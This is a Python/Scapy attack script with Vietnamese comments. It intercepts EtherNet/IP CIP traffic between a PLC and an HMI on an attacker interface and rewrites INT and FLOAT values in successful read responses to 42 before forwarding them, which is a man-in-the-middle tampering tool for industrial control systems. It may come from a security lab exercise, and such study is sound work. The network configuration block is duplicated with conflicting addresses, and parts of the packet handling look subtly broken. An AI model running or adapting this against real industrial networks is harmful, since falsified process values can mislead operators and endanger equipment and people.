#!/usr/bin/python3
from scapy.all import *
import struct

# Cấu hình mạng
IP_CONFIG = {
    'plc1': '192.168.1.10',
    'hmi': '192.168.1.20',
    'attacker': '192.168.1.77',
}
# Cấu hình mạng
IP_CONFIG = {
    'plc1': '192.168.1.10',
    'hmi': '192.168.1.90',
    'attacker': '192.168.1.110',
}

# Thay thế giá trị INT hoặc FLOAT trong gói CIP
def modify_payload(data):
    if len(data) > 44:  # Đảm bảo dữ liệu đủ dài
        cip_service = data[40:41]  # CIP Service
        cip_status = data[42:43]  # CIP Status
        data_type = data[44:46]   # Data type

        if cip_service == b'\xcc' and cip_status == b'\x00':  # Chỉ sửa gói thành công
            if data_type == b'\xc3\x00':  # INT
                print("[*] Modifying INT value...")
                new_value = struct.pack('<h', 42)  # INT 16-bit little-endian
                data = data[:46] + new_value + data[48:]
            elif data_type == b'\xca\x00':  # FLOAT
                print("[*] Modifying FLOAT value...")
                new_value = struct.pack('<f', 42.0)  # FLOAT 32-bit IEEE 754
                data = data[:46] + new_value + data[50:]
    return data

# Hàm xử lý gói tin
def spoof_pkt(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        # Forward các gói tin SYN và SYN-ACK để thiết lập kết nối TCP
        if pkt[TCP].flags in ['S', 'SA']:
            print(f"[*] Forwarding TCP {pkt[TCP].flags}")
            send(pkt, verbose=False)
            return

        # Kiểm tra nếu gói TCP chứa payload CIP
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            if b'CIP' in data:  # Gói tin CIP
                print("[*] CIP packet detected!")
                newdata = modify_payload(data)  # Sửa đổi dữ liệu CIP
                newpkt = IP(bytes(pkt[IP])) / newdata
                del(newpkt.chksum, newpkt[TCP].chksum)
                send(newpkt, verbose=False)
                return
        
        # Forward gói tin TCP khác
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum, newpkt[TCP].chksum)
        send(newpkt, verbose=False)
    else:
        # Forward các gói tin không phải TCP/IP
        send(pkt, verbose=False)
   
# Lọc và chặn gói tin TCP
pkt = sniff(iface='attacker-eth0', prn=spoof_pkt)

